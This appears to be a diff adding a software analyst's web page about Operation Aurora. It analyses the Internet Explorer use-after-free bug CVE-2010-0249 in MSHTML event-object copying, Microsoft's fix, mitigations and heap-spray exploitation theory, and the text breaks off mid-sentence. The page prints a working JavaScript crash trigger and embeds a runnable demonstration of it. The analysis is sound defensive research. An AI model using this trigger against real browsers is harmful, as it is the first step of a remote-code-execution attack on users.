@@ -1,0 +1,880 @@
+﻿<!doctype html>
+<html lang="en">
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; frame-src 'self'; img-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self'">
+<title>Operation Aurora</title>
+<link rel="stylesheet" type="text/css" href="../../../_styles/master.css">
+<link rel="stylesheet" type="text/css" href="../../../_styles/document.css">
+<link rel="stylesheet" type="text/css" href="../../../_styles/controls.css">
+<link rel="stylesheet" type="text/css" href="../../../_styles/box.css">
+<link rel="stylesheet" type="text/css" href="../../../_styles/demo.css">
+<link rel="stylesheet" type="text/css" href="../../_styles/notes.css">
+<script type="text/javascript" src="../../../_scripts/master.js"></script>
+<script type="text/javascript" src="../../../_scripts/document.js"></script>
+<script type="text/javascript" src="../../../_scripts/controls.js" defer></script>
+<script type="text/javascript" src="../../../_scripts/box.js" defer></script>
+<script type="text/javascript" src="../../../_scripts/demo.js" defer></script>
+<script type="text/javascript" src="../../_scripts/notes.js" defer></script>
+</head>
+
+<body>
+
+<!--webbot bot="Include" U-Include="../../_include/noscript.htm" TAG="BODY" startspan -->
+
+<div class="NoScript Header" id="Banner">
+  <div id="Links">
+    <ul class="LinkList">
+      <li> 
+      <ul class="PreferNoWrap">
+        <li class="LinkListItem"><a href="../../../index.htm">Home</a> </li><!--
+     --><li class="LinkListItem"><a target="_self" href="../../toc.htm">Table of Contents</a> </li><!--
+     --><li class="LinkListItem"><a href="../../../about/index.htm">About This Site</a> </li>
+      </ul>
+      <ul class="PreferNoWrap">
+        <li class="LinkListItem"><a href="../../../new/index.htm">What’s New?</a> </li><!--
+     --><li class="LinkListItem"><a href="../../../feedback/index.htm">Feedback</a> </li><!--
+     --><li class="LinkListItem"><a href="../../../consult/index.htm">Consult</a> </li>
+      </ul>
+      </li>
+    </ul>
+  </div>
+  <div id="Logo">
+    <p><span class="PreferNoWrap">Geoff Chappell -</span> <span class="PreferNoWrap">Software Analyst</span> </p>
+  </div>
+</div>
+
+<!--webbot bot="Include" endspan i-checksum="55207" -->
+<div class="Main">
+  <h1>Operation Aurora </h1>
+  <p>The news was alive in January 2010 with talk of how Google was thinking of
+  <a target="_top" href="http://googleblog.blogspot.com/2010/01/new-approach-to-china.html">
+  a new approach to China</a>, possibly including to withdraw its business, after 
+  what was said to be a “highly sophisticated and targeted attack on our corporate 
+  infrastructure originating from China” in December 2009. Early technical analysis, 
+  including to publish that the attack exploits a vulnerability in Internet Explorer 
+  that had been unknown to the security industry, seems to have been in the hands 
+  of MacAfee, whose page
+  <a target="_top" href="http://siblog.mcafee.com/cto/operation-%25E2%2580%259Caurora%25E2%2580%259D-hit-google-others/">
+  Operation Aurora Hit Google, Others</a> christens the attack and has George Kurtz 
+  effusing that “the world has changed” and that “everyone’s threat model now needs 
+  to be adapted to the new reality of these advanced persistent threats”. </p>
+  <p>Statements like that easily get my attention since I have been saying for years 
+  that reverse engineering of malware as practised by the computer security industry 
+  is primitive and seems likely to stay that way since the industry has little or 
+  no incentive to invest in improvement. The industry must eventually face malware 
+  whose complexity, if not sophistication, exceeds the industry’s capacity for analysis. 
+  Though I certainly don’t want malware to get better at what it does, that it will 
+  get better is just inevitable, and I can’t help but await the industry’s game-changing 
+  moment when it realises that reverse engineering is not a hobby, or even an occasional 
+  tool, but is more like a performance art that requires years of dedicated practice 
+  (which few would ever think to commit to without support). </p>
+  <p>For a reverse engineer from outside the industry, the first difficulty in studying 
+  an attack is with getting the code that was used for the attack. This was made 
+  public, sort of, a few days after the initial reports. Although several pages 
+  on the Internet talked of relevant code having “been published on the Internet”,
+  <a target="_top" href="http://www.pcworld.com/businesscenter/article/187040/attack_code_used_to_hack_google_now_public.html">
+  Attack Code Used to Hack Google Now Public</a> is the first I know that said where. 
+  It provided a URL at the
+  <a target="_top" href="http://wepawet.iseclab.org/view.php?hash=1aea206aa64ebeabb07237f1e2230d0f&amp;type=js">
+  Wepawet malware analysis website</a>. The code given there is not syntactically 
+  valid and has a space that’s in the wrong place. Though these minor errors were 
+  presumably introduced while formatting the code for presentation, there is the 
+  additional problem that no provenance is given: it could be any code from anywhere 
+  for any purpose. </p>
+  <p>Still, the working assumption must be that people at the targeted companies 
+  were invited to visit a web page whose HTML is very similar to what’s posted at 
+  the Wepawet site. The script in this HTML triggers a bug in Internet Explorer 
+  after arranging an increased probability that Internet Explorer does not crash 
+  in response to the bug but is instead induced to execute the attacker’s bootstrap 
+  code (which is also in the script). This in turn downloads an executable file 
+  from a preset website and then runs that executable. </p>
+  <h2>Mitigations </h2>
+  <p>Some few practical points ought be noted at the outset. First, although the 
+  bug is present in very nearly a decade’s worth of Internet Explorer versions, 
+  and can crash all these versions, the reported attack hardly ever gets as far 
+  as trying to execute the attacker’s code if the Internet Explorer version is 7.0 
+  or higher. Variations of the attack might, of course. </p>
+  <p>Since the bootstrap code is provided as script, it is handled by Internet Explorer 
+  only as data. If Data Execution Prevention (DEP) is enabled, then if the attack 
+  does succeed at subverting the bug so that Internet Explorer does not crash, DEP 
+  will crash Internet Explorer for you rather than let it unwittingly execute data. 
+  DEP requires at least Windows XP SP2 or Windows Server 2003 SP1 (if we don’t count 
+  undocumented AMD-specific support in the original Windows Server 2003). Really, 
+  you should have DEP enabled, always. Any software that is incompatible with DEP 
+  is better replaced or discarded. </p>
+  <div class="Digression">
+    <div class="Box">
+      <p>Sadly, such software does exist, even from Microsoft. One example is the 
+      Document Explorer program that accompanies the Microsoft Developer Network 
+      (MSDN) Library on disc. Version 7, as supplied with editions from 2003 and 
+      2004, fails to start if DEP is enabled. Fortunately for those who are curious 
+      to know what Microsoft wrote about DEP ahead of releasing Windows XP SP2, 
+      this old documentation is readable using version 8. </p>
+    </div>
+  </div>
+  <p>If you disable Active Scripting, then Internet Explorer will never interpret 
+  any script. As used in the attack, the bug cannot then cause Internet Explorer 
+  to crash, let alone to be exploited. You are entirely safe from the attack. Against 
+  that, your experience of browsing the web will be very much poorer. Although disabling 
+  scripts protects you from this and other security problems, it cannot sensibly 
+  be recommended as standard practice for everyday web browsing by everyday users. 
+  Many websites will present you with an error message directing you to enable scripting. 
+  Some will just present you with a blank page. Many more will misbehave in various 
+  ways because they don’t so much require scripting for additional functionality 
+  as assume it for basic functionality. An example is Microsoft’s MSDN site, which 
+  presents its programming documentation without a scrollbar so that you can’t read 
+  the whole text unless you enable scripting. Indeed, the widespread practice of 
+  writing web pages that take scripting for granted is largely Microsoft’s responsibility: 
+  Microsoft evidently writes its websites without much thought for the security-conscious, 
+  and it’s no surprise that numerous other websites follow Microsoft’s lead. </p>
+  <p>Anything that can be done in script can be done by executable code delivered 
+  to Internet Explorer as an ActiveX control. Although this attack uses script, 
+  other attacks that exploit the same bug may use ActiveX controls. Of course, if 
+  you’re security conscious, you will have disabled ActiveX controls long before 
+  wondering whether Active Scripting is something to disable too. You will also 
+  have noticed that many websites expect you to run ActiveX controls, if not actually 
+  to download them, and that most of these websites degrade significantly if you 
+  decline to let them execute their choice of code on your computer. </p>
+  <p>Finally, Internet Explorer the web browser is not just an application program. 
+  The essential DLLs of Internet Explorer act as operating-system components that 
+  provide HTML functionality to a wide variety of other applications. Since the 
+  bug is in one of those DLLs, it can also crash these other programs or induce 
+  them to run an attacker’s code on your computer. Unfortunately, the list of such 
+  programs is open-ended since the hosting and reuse of Internet Explorer components 
+  has long been documented by Microsoft as a significant programming feature. The 
+  good news is that most such programs don’t take as input an arbitrary HTML page 
+  received over the Internet. The ones that do typically don’t run scripts or ActiveX 
+  controls, but you may do well to check. </p>
+  <div class="Digression">
+    <div class="Box">
+      <p>One such program hides in plain sight on every Windows machine. It is Microsoft’s 
+      HTML Help tool, HH.EXE, which displays CHM files. Though HH is not a web browser, 
+      it will open an arbitrary HTML or CHM file, using MSHTML for rendering, and 
+      will run JavaScript from that file. An HTML file with script could be compiled 
+      into a CHM file and sent in email as an attachment. Opening the attachment 
+      will run Internet Explorer by proxy. A special danger with this line of attack 
+      is that the users who are most exposed are those who prefer other browsers, 
+      e.g., because they think Internet Explorer is insufficiently secure. With 
+      no direct reason to update the Internet Explorer that they don’t want (and 
+      whose presence they may even resent), they are the most likely to have an 
+      old version whose known security vulnerabilities have not been fixed. Fortunately, 
+      CHM files are regarded as unsafe attachments and are blocked by most email 
+      readers. </p>
+    </div>
+  </div>
+  <h2>Investigation </h2>
+  <p>Some forensic points may better be noted, too. This article is concerned only 
+  with what can be known about the bug and its exploitation from the publicly disclosed 
+  script and from inspection of Internet Explorer. Where reports describe this attack 
+  as a sophisticated operation, they must be talking about things that happen before 
+  or after the attack. By before, I mean the planning of who to target and how to 
+  entice them to a web page that would run the script that launches the attack. 
+  No amount of inspecting code can help with that, and it is conspicuous that very 
+  little information of any sort is in the public domain to support any talk of 
+  how the attack was targeted. By after, I mean whatever is done by the downloaded 
+  executable, which could be any Trojan and can have been developed independently 
+  of the attack. I have no copy of the Trojan for inspection. By the time I looked 
+  at the preset URL to get the Trojan, there was no file there to download and the 
+  root of the website was just the default page of a newly installed IIS7 website.
+  </p>
+  <p>I could, of course, get whatever Trojan has been seen in the attacks. Copies 
+  are surely in circulation. What puzzles me, though, and what I want to concentrate 
+  on, is how the attacks ever got as far as downloading a Trojan. How was the attack 
+  delivered to its victims, what is the Internet Explorer bug that allowed the attack 
+  to work, and how did this bug get exploited? On these questions, curiously little 
+  detail has been made public. </p>
+  <h2>The Internet Explorer Bug </h2>
+  <p>Even finding out which bug allows the attack is difficult enough. Nobody would 
+  be able to locate the bug just from what Microsoft writes about it. The
+  <a target="_top" href="http://www.microsoft.com/technet/security/advisory/979352.mspx">
+  Microsoft Security Advisory (979352): Vulnerability in Internet Explorer Could 
+  Allow Remote Code Execution</a> seems to be a natural starting point for what 
+  Microsoft wants to say. Amidst large tracts of boilerplate text that apply generally 
+  to defending against an attack through this sort of bug, the page has only one 
+  sentence that describes this bug specifically: </p>
+  <blockquote>
+    The vulnerability exists as an invalid pointer reference within Internet Explorer.
+  </blockquote>
+  <p>Of course, the page is up-front about presenting only General Information, 
+  and indeed only an Executive Summary, but it’s not as if there’s any mention of 
+  another page where Microsoft gives detailed information. A little more is offered 
+  in a Microsoft blog
+  <a target="_top" href="http://blogs.technet.com/srd/archive/2010/01/15/assessing-risk-of-ie-0day-vulnerability.aspx">
+  Security Research &amp; Defense: Assessing risk of IE 0day vulnerability</a>:
+  </p>
+  <blockquote>
+    The vulnerability is an Internet Explorer memory corruption issue triggered 
+    by an attacker using JavaScript to copy, release, and then later reference a 
+    specific Document Object Model (DOM) element.
+  </blockquote>
+  <p>Fortunately for any notion of independent evaluation, someone has published 
+  HTML code that was supposedly seen in real-world exploitation of this same vulnerability. 
+  The code can be read by anyone who’s interested and most who do read it will surely 
+  get at least an inkling of what’s going on, particularly that the “specific DOM 
+  element” must be the <span class="object">event</span> object. </p>
+  <p>Strictly speaking, the <span class="object">event</span> object is an
+  <span class="interface">IHTMLEventObj4</span> interface implemented by MSHTML.DLL 
+  in a tear-off thunk for an instantiation of the <span class="class">
+  <a href="../../../studies/windows/ie/mshtml/classes/ceventobj.htm">CEventObj</a></span> 
+  class. Though the <span class="class">CEventObj</span> in effect
+  <span class="emphasis">is</span> the <span class="object">event</span> object, 
+  it does not hold the <span class="object">event</span> properties directly. These 
+  are in an <span class="struct">EVENTPARAM</span> structure. Most events have a 
+  source element, accessible as the <span class="property">srcElement</span> property. 
+  However the <span class="property">srcElement</span> is not stored directly in 
+  the <span class="struct">EVENTPARAM</span> as a pointer to the element’s representation 
+  as a <span class="class">
+  <a href="../../../studies/windows/ie/mshtml/classes/celement.htm">CElement</a></span> 
+  class. Instead, the <span class="struct">EVENTPARAM</span> has a pointer to the 
+  element’s node in the DOM tree. This is also true, incidentally, for the
+  <span class="property">fromElement</span> and <span class="property">toElement</span> 
+  properties, though these are meaningful only for a couple of event types. Each 
+  tree node has a pointer to its element and vice versa. The tree nodes themselves 
+  seem intended as internal to MSHTML. The <span class="class">CTreeNode</span> 
+  class is not a COM class. Indeed, it has no virtual member functions of any sort. 
+  It does have ordinary member functions that give it the appearance of its element 
+  and which perform reference counting even though the class does not hold its own 
+  reference count. It is this last point that gives us the present bug. </p>
+  <p>There can be no doubt that if <span class="class">CTreeNode</span> were a COM 
+  class, then any programmer given charge of MSHTML would always be on the lookout 
+  for the possibility that a tree node’s <span class="method">AddRef</span> method 
+  needs to be called before a pointer to that tree node can safely be set into any 
+  structure whose lifetime is not certainly contained in the lifetime of the node. 
+  Instead, although the <span class="class">CTreeNode</span> class does have a
+  <span class="method">NodeAddRef</span> member function, and does get it used, 
+  pointers to tree nodes are often passed around without adding a reference. It 
+  may be that this was once-upon-a-time well supported by some close understanding 
+  of the relevant objects’ lifetimes, but it nowadays looks in need of a rethink.
+  </p>
+  <p>Certainly, there is a problem when an <span class="struct">EVENTPARAM</span> 
+  is copied, as can be done in either of this structure’s constructors. The input
+  <span class="struct">EVENTPARAM</span> may already have non-NULL pointers to nodes 
+  for the <span class="property">srcElement</span>, <span class="property">fromElement</span> 
+  and <span class="property">toElement</span>. The new <span class="struct">EVENTPARAM</span> 
+  receives copies of these pointers to the nodes but without any adding of references. 
+  The nodes and their elements then know nothing of these copies. This is a problem 
+  if the new <span class="struct">EVENTPARAM</span> outlives the original. When 
+  the original <span class="struct">EVENTPARAM</span> is no longer needed once the 
+  event it was created for has been handled, if the node is no longer wanted in 
+  the tree, then the node will be freed even though the second
+  <span class="struct">EVENTPARAM</span> still has a pointer to it. </p>
+  <p>That is the essence of the reported bug. It dates from MSHTML version 5.50. 
+  This is the first version to have <span class="struct">EVENTPARAM</span> constructors 
+  that can copy another <span class="struct">EVENTPARAM</span>. It is also the first 
+  to provide, via the <span class="object">document</span> object’s
+  <span class="method">createEventObject</span> method, a means of getting an
+  <span class="struct">EVENTPARAM</span> copied just by using script in a way that 
+  the copy can be made to outlive the original. </p>
+  <h3>Demonstration </h3>
+  <p>If we aim to trigger the bug entirely in script, then the following must be 
+  near to minimal. (It can be made a little smaller. Instead of creating a child 
+  element on which to fire an event, just fire the event on the body. However, removing 
+  the body from the DOM tree is artificial to the point that it might confuse about 
+  what exactly is necessary for the bug.) Just insert this script as the whole of 
+  a <span class="htmltag">&lt;script&gt;</span> block that is in turn the whole 
+  of an HTML page’s <span class="htmltag">&lt;body&gt;</span>: </p>
+  <pre class="source">var SourceElement = document.createElement (&quot;div&quot;);     /* just about any element type */
+document.body.appendChild (SourceElement);
+var SavedEvent = null;
+SourceElement.onclick = function () {
+    SavedEvent = document.createEventObject (event);
+    document.body.removeChild (event.srcElement);
+}
+SourceElement.fireEvent (&quot;onclick&quot;);                    /* just about any event type, but must match handler */
+SourceElement = SavedEvent.srcElement;</pre>
+  <p>This script creates an HTML element, inserts it into the DOM tree, sets an 
+  event handler for the element and then fires an event on that element. The handler 
+  uses the <span class="object">document</span> object’s <span class="method">createEventObject</span> 
+  method to clone the given <span class="object">event</span> object, which is then 
+  saved in a global variable so that it outlives the event. Cloning the given
+  <span class="object">event</span> has the internal effect of copying the event’s
+  <span class="struct">EVENTPARAM</span> structure, including its pointer to the
+  <span class="class">CTreeNode</span> for the source element. The handler then 
+  removes this source element from the tree. By the time the event has finished, 
+  the <span class="class">CTreeNode</span> is freed from memory but a pointer to 
+  it persists in the <span class="struct">EVENTPARAM</span> structure for the saved
+  <span class="object">event</span> object. The script ends by asking for the
+  <span class="property">srcElement</span> property of this object, knowing that 
+  MSHTML can evaluate this property only by using this stale pointer. </p>
+  <p>If you want that even the <span class="htmltag">&lt;body&gt;</span> should 
+  be empty, then move the <span class="htmltag">&lt;script&gt;</span> block to the 
+  head after recasting so that what’s presently done in global variables is instead 
+  the body of a function that is certain to execute when the document has loaded:
+  </p>
+  <pre class="source">function window :: onload ()
+{
+    var SourceElement = document.createElement (&quot;div&quot;);
+    document.body.appendChild (SourceElement);
+    var SavedEvent = null;
+    SourceElement.onclick = function () {
+        SavedEvent = document.createEventObject (event);
+        document.body.removeChild (event.srcElement);
+    }
+    SourceElement.fireEvent (&quot;onclick&quot;);
+    SourceElement = SavedEvent.srcElement;
+}</pre>
+  <p>If I dwell on this, it’s to make the point that this is a bug that can be triggered 
+  just by visiting an empty web page—not just one that has something hidden, but 
+  one whose body truly is completely empty. </p>
+  <div class="Demonstration">
+    <p>If you prefer to test for this bug immediately, rather than cut and paste 
+    into a page at your own web server, click on the Show Demonstration button below 
+    to reveal some similar script and a Run Demonstration button that will run that 
+    script from this page. Do not click on that second button unless you are prepared 
+    for Internet Explorer to crash! </p>
+    <!--webbot bot="Include" U-Include="../../_include/showdemo.htm" TAG="BODY" startspan -->
+
+<p class="NoScript alert">There would ordinarily be controls here for 
+running the script that shows in the box immediately below. To proceed with 
+the demonstration, enable scripts and then refresh this page. </p>
+
+<!--webbot bot="Include" endspan i-checksum="33319" -->
+    <pre id="Run" class="Script">function Run ()
+{
+    var SourceElement = document.createElement ("div");
+    document.body.appendChild (SourceElement);
+    var SavedEvent = null;
+    SourceElement.onclick = function () {
+        SavedEvent = document.createEventObject (event);
+        document.body.removeChild (event.srcElement);
+    }
+    SourceElement.fireEvent ("onclick");
+    SourceElement = SavedEvent.srcElement;
+    alert ("Source Element recovered from saved event: "
+            + "element type is " + (SourceElement != null ? SourceElement.tagName : "(null)"));
+}</pre>
+    <p>To be meaningful for when Microsoft has fixed the bug, the demonstration 
+    script ends with a message box to confirm that the script did run (and that 
+    it retrieves a plausibly correct source element). </p>
+  </div>
+  <h3>What Sort of Fix? </h3>
+  <p>As noted above, this is not one of those bugs that is caused just by a line 
+  or two in the source code and which might be fixed for the moment by patching 
+  a few bytes in the executable (pending a proper update from the manufacturer). 
+  If I am right, MSHTML has a potentially wide-ranging problem with its reference 
+  counting of nodes. Any update that doesn’t obviously look like having dealt with 
+  this ought not be accepted as a fix. </p>
+  <p>For instance, it will inevitably cross someone’s mind to react to this bug 
+  by disabling the <span class="method">createEventObject</span> method, presumably 
+  as an option, perhaps implemented as yet another of the many
+  <a href="../../windows/ie/featurecontrol.htm">Internet Explorer feature controls</a>. 
+  It may be that this method isn’t much missed. However, it may be that
+  <span class="method">createEventObject</span> actually is vital to some web pages, 
+  which I expect it is for pages that simulate user actions, e.g., for tutorials 
+  on using web pages. Remember that the standard DOM model for events, despite significant 
+  differences from Microsoft’s, also provides for creating event objects. The functionality 
+  is not so obviously obscure that it won’t be missed if disabled as a security 
+  measure. More importantly, disabling <span class="method">createEventObject</span> 
+  looks like shooting the messenger. Although <span class="method">createEventObject</span> 
+  is the easy and obvious means of triggering the bug, it might not be the only 
+  means. Probably the only way to be sure would be to look at all ways that
+  <span class="struct">EVENTPARAM</span> structures can get copied, paying particular 
+  attention to lifetimes and to the reference counting of nodes whose addresses 
+  ever get entered into <span class="struct">EVENTPARAM</span> structures. If anyone 
+  at Microsoft is going to do that, then they may as well fix the reference counting 
+  so that <span class="method">createEventObject</span> works well enough that nobody 
+  should fear it. </p>
+  <p>For as long as MSHTML has <span class="struct">EVENTPARAM</span> constructors 
+  that can copy another <span class="struct">EVENTPARAM</span> without the caller 
+  having to know or care about the contents of the input <span class="struct">EVENTPARAM</span>, 
+  these constructors must be changed so that they call the <span class="method">
+  NodeAddRef</span> method for each node that is already pointed to from the input
+  <span class="struct">EVENTPARAM</span>. They do, of course, already call the
+  <span class="method">AddRef</span> method of each COM object that may be pointed 
+  to from the given <span class="struct">EVENTPARAM</span>. The wonder is that doing 
+  the equivalent for the nodes has been missed. </p>
+  <p>Not only is it necessary to fix the <span class="struct">EVENTPARAM</span> 
+  constructors, it’s also sufficient if all that’s wanted is a quick and dirty way 
+  to escape this bug. By doing just this, all nodes whose addresses ever get copied 
+  into an <span class="struct">EVENTPARAM</span> by an <span class="struct">EVENTPARAM</span> 
+  constructor can never get freed in error—but neither can they ever get freed when 
+  they ought to be. The bug would go away but at the price of an ever-growing number 
+  of unwanted nodes that remain in memory for no good reason. Microsoft will surely 
+  present a proper solution before anyone feels compelled to resort to any such 
+  quick-and-dirty solution. </p>
+  <p>For a proper solution, calls to add a reference must be balanced by calls to 
+  release the reference. Unfortunately, it’s not enough just to add corresponding 
+  calls to <span class="method">NodeRelease</span> in the <span class="struct">EVENTPARAM</span> 
+  destructor. Pointers to nodes are not set into <span class="struct">EVENTPARAM</span> 
+  structures only by the constructors. Of these other cases, some call
+  <span class="method">NodeAddRef</span> for the node, and some do not. For some, 
+  a <span class="method">NodeAddRef</span> will be needed, and for some not. Similar 
+  variability applies to releasing nodes. I expect that although the right handling 
+  is easily enough prescribed, changing existing code to conform to the prescription 
+  requires careful inspection, which is perhaps not even feasible at short order 
+  except by someone who has been immersed in the MSHTML code for a long time.
+  </p>
+  <p>This is perhaps as good a place as any to bring out another hobby horse. Another 
+  inevitability with a bug like this is that some will say Internet Explorer has 
+  unusually many bugs like this because Microsoft does not open its source code 
+  to public inspection. Whether they’re right with their assessment, I don’t know, 
+  but I doubt they can be right with the explanation. Any difficulty with reading 
+  software like MSHTML without its C++ source code, especially if aided by symbol 
+  files, is nothing compared with the huge investment required for
+  <span class="emphasis">understanding</span> the code, which must run to millions 
+  of lines. I have not spent a working life immersed in the MSHTML code. Who has 
+  and who would want to? I may be way off track with my analysis—but I expect I 
+  could as easily be as far off track even if I had the source code. Moreover, having 
+  source code could take me off track in a different direction and give me a false 
+  security about it. Most of what you can get from reading source code but can’t 
+  get from reading the binary code (with symbol files) is the commenting—and in 
+  code that is known to have allowed a bug to lie undiscovered for a decade, the 
+  comments are plausibly part of the problem. </p>
+  <h3>Microsoft’s Fix </h3>
+  <p>As it turns out, I’m no more off track than are Microsoft’s own programmers. 
+  On 21st January (U.S. time), Microsoft released a cumulative security update as
+  <a target="_top" href="http://www.microsoft.com/technet/security/bulletin/ms10-002.mspx">
+  Microsoft Security Bulletin MS10-002 - Critical</a> which “resolves seven privately 
+  reported vulnerabilities and one publicly disclosed vulnerability in Internet 
+  Explorer”. The latter is apparently the bug being examined here, identified in 
+  the update’s description as CVE-2010-0249. </p>
+  <p>I do not propose to check all the downloadable packages for the various combinations 
+  of Internet Explorer and Windows versions. For this analysis I have looked only 
+  at how the update applies to what I happen to have the best notes on, namely the 
+  Internet Explorer 7 from the original (x86) Windows Vista. The corresponding update 
+  provides six different MSHTML.DLL executables for installation as assemblies in 
+  the WinSxS directory. The executable that gets installed in the SYSTEM32 directory, 
+  and is used when Internet Explorer is run, is version 7.0.6000.16982. Anything 
+  I say here about Microsoft’s fix is based on comparison of that version with the 
+  version 7.0.6000.16386 from the original Windows Vista: </p>
+  <table class="FileVersions">
+    <colgroup>
+      <col class="FileVersion"><col class="DateStamp"><col class="Size">
+      <col class="Package">
+    </colgroup>
+    <tr>
+      <th>File Version </th>
+      <th>File Header Date Stamp </th>
+      <th>Size </th>
+      <th>Package </th>
+    </tr>
+    <tr>
+      <td>7.0.6000.16386 </td>
+      <td>4549BD75 (2nd November 2006) </td>
+      <td>3,580,416 </td>
+      <td>original Windows Vista </td>
+    </tr>
+    <tr>
+      <td>7.0.6000.16982 </td>
+      <td>4B2B7AF4 (18th December 2009) </td>
+      <td>3,599,360 </td>
+      <td>
+      <a target="_top" href="http://www.microsoft.com/downloads/details.aspx?FamilyID=92495551-dedd-43d4-bb3a-51028bc5c6d6">
+      downloaded security update</a> </td>
+    </tr>
+  </table>
+  <p>The new build inserts new code into the two <span class="struct">EVENTPARAM</span> 
+  constructors so that they call <span class="method">NodeAddRef</span> for each 
+  non-NULL pointer that the input <span class="struct">EVENTPARAM</span> has for 
+  the <span class="property">srcElement</span>, <span class="property">fromElement</span> 
+  and <span class="property">toElement</span> properties. </p>
+  <div class="Digression">
+    <div class="Box">
+      <p>The new code for the <span class="struct">EVENTPARAM</span> constructors 
+      also deals with other data members, namely the <span class="struct">VARIANT</span> 
+      for the <span class="property">returnValue</span> and the
+      <span class="struct">CStr</span> structures for the <span class="property">
+      type</span>, <span class="property">propertyName</span>,
+      <span class="property">qualifier</span> and <span class="property">srcUrn</span> 
+      properties, that were previously copied byte by byte. I do not know if this 
+      change was made simply as a natural reconsideration of how the constructors 
+      are coded, or whether it was prompted by observation of ill effect, or even 
+      whether such ill effect can be arranged in builds that predate the bug fix.
+      </p>
+    </div>
+  </div>
+  <p>A new global function standardises the setting of pointers to nodes. Acting 
+  much as for smart pointers, this function ensures that when a pointer is set to 
+  the non-NULL address of a node, a <span class="method">NodeAddRef</span> is called 
+  for the new node. Correspondingly, any node that was held in the pointer gets 
+  a <span class="method">NodeRelease</span>. The <span class="struct">EVENTPARAM</span> 
+  destructor has new code that uses this new function to clear the
+  <span class="property">srcElement</span>, <span class="property">fromElement</span> 
+  and <span class="property">toElement</span> pointers. Assuming that this new function 
+  is now used exclusively when setting pointers to nodes into
+  <span class="struct">EVENTPARAM</span> structures, Microsoft has indeed straightened 
+  out the reference counting of tree nodes with regards to their storage in
+  <span class="struct">EVENTPARAM</span> structures. </p>
+  <p>The bug is therefore fixed. But look at the date stamp for the new MSHTML. 
+  Though Microsoft’s security advisory for this bug, published on 14th January 2010, 
+  never put a date to the “attacks … using a vulnerability in Internet Explorer” 
+  let alone to Microsoft’s knowledge of that vulnerability, the date stamp for the 
+  updated MSHTML puts beyond dispute that Microsoft had not only known of the vulnerability 
+  nearly a month earlier but had fixed it. Moreover, Microsoft had already fixed 
+  the bug not as an update just for the latest Internet Explorer version but for 
+  each of three versions. Is parallel correction Microsoft’s usual practice for 
+  bugs in Internet Explorer or is it a sign that Microsoft regarded the bug as critical 
+  even in mid-December 2009? </p>
+  <p>I’m not saying that Microsoft is in any sense at fault for taking months to 
+  fix a bug, just that Microsoft’s official publication to the world, meaning the 
+  security advisory, might better have provided a less empty historical record from 
+  the start. That has been left instead to a Microsoft blog. At
+  <a target="_top" href="http://blogs.technet.com/msrc/archive/2010/01/21/bulletin-ms10-002-released.aspx">
+  Bulletin MS10-002 Released</a>, dated 21st January, Jerry Bryant explains that
+  </p>
+  <blockquote>
+    … this Internet Explorer security update was already planned for release in 
+    February. When the attack discussed in Security Advisory 979352 was first brought 
+    to our attention on Jan 11, we quickly released an advisory for customers three 
+    days later. As part of that investigation, we also determined that the vulnerability 
+    was the same as a vulnerability responsibly reported to us and confirmed in 
+    early September.
+  </blockquote>
+  <p>Perhaps only the naive would imagine that any large software manufacturer could 
+  move faster than that, or ought to. After all, until Microsoft learnt that the 
+  vulnerabilty actually was being exploited for a security attack, it was just a 
+  bug that can crash Internet Explorer just for looking at a page. No biggie! Five 
+  or six months is apparently what Microsoft ordinarily plans for correcting such 
+  bugs. If we didn’t know before, we know now. </p>
+  <p>More contentious may be the question of how a newly discovered bug percolates 
+  through Microsoft’s processes to be evaluated as a security vulnerability. As 
+  noted above, Microsoft itself refers to this bug as
+  <a target="_top" href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0249">
+  CVE-2010-0249</a>, which is its number in a public list of Common Vulnerabilities 
+  and Exposures. Its (candidate) entry in that list is dated 7th January 2010, i.e., 
+  before Microsoft learnt that the bug had found real-world use in an attack but 
+  months after Microsoft learnt of the bug itself. </p>
+  <p>While speculating on things that can’t be known through any amount of inspecting 
+  either Microsoft’s code or the attacker’s, let me draw attention to one more point. 
+  This bug’s life has run for nearly 10 years. If attackers have the capacity to 
+  learn of bugs independently of Microsoft, then they might have learnt of this 
+  bug at any time in those 10 years. Did that happen, and the attackers sat on their 
+  discovery, waiting to put it to use? Or did they just by fluke discover the bug 
+  (and how to exploit it) simultaneously with the bug having been “responsibly reported” 
+  to Microsoft? </p>
+  <h2>Exploiting the Bug </h2>
+  <p>A minimal expectation of all modern operating systems is that when a program 
+  uses a pointer to memory that has been freed (and perhaps reused), the overwhelmingly 
+  most probable consequence is that the program soon does something that the CPU 
+  detects as invalid, prompting the operating system to crash the program. To turn 
+  overwhelming probability to certainty is at least unrealistic if not actually 
+  impossible. For instance, unless a memory manager arranges the luxury of never 
+  reusing memory that has been freed, memory that once held data for one instance 
+  of some class might again hold data for another instance of exactly that same 
+  class. Though the program thinks erroneously that it is still working with the 
+  first instance, its code may reasonably be satisfied with what it finds from the 
+  second instance. The only sign that anything is wrong might be that bad results 
+  are reported to the user because the program has confused one instance for the 
+  other. Of course, operating systems have a role in minimising such possibilities, 
+  but there is only so much that can be done. There is unavoidably some very slight 
+  possibility that by the time a program uses memory that has been freed, what is 
+  still in this memory or has since been put there (e.g., by reusing the memory) 
+  will be just right enough that the error is not caught and does not crash the 
+  program. </p>
+  <p>Cyber-attackers live for this sort of marginal possibility. Especially attractive 
+  to them is that they may be able to manipulate what’s at the freed memory so that 
+  they not only stop the program from crashing but can instead divert the program 
+  to execute the attacker’s choice of code. That their imaginations can realistically 
+  reach so far is because many programs make very heavy use of pointers to functions. 
+  The DLLs of Internet Explorer, especially MSHTML, must be some of the heaviest 
+  users around of pointers to functions. Very many memory allocations by MSHTML 
+  hold a COM object (or a tear-off thunk for a COM object) containing at least one 
+  pointer to a virtual function table, each of which is itself an array of pointers 
+  to functions. </p>
+  <h3>Brute-Force Theory </h3>
+  <p>Because MSHTML is so rich in pointers to functions, brute force can work wonders 
+  for the attacker. Between the time that the program frees some memory while keeping 
+  a pointer to it and the time that the program uses that stale pointer to try accessing 
+  the memory, the attacker may be able to flood the program’s free heap space with 
+  pointers. The pointers may all have the same target address, but this is enough 
+  for the attacker’s first goal. When the program accesses the previously freed 
+  memory, there’s a very good chance that it is looking to find a pointer in this 
+  memory. If this setting up of the attack succeeds, there’s a good chance that 
+  what the program finds in this memory is one of the attacker’s pointers. When 
+  the program follows this pointer to whatever it wants to work with next, it will 
+  still be executing its own code but it will be looking where the attacker wanted 
